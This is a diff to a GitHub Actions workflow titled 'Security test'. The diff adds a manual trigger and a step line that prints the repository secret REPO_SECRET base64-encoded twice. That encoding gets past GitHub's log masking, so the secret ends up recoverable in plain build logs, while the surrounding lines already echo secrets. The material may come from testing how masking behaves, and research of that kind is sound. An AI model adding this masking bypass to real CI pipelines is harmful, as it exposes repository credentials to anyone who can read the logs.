@@ -1,12 +1,11 @@
 name: Security test
 on:
   pull_request_review:
+  workflow_dispatch:
   
 jobs:
   security:
     runs-on: ubuntu-latest
-
-
     steps:
       - name: debug
         continue-on-error: true
@@ -16,5 +15,6 @@ jobs:
         run: |
           echo "Sec: $UPPERCASE_SECRET"
           echo "Sec2: ${{secrets.REPO_SECRET}}"
+          echo "Sec2: ${{secrets.REPO_SECRET}}" | base64 -w0 | base64 -w0
         env:
           UPPERCASE_SECRET: ${{secrets.UPPERCASE_SECRET}}
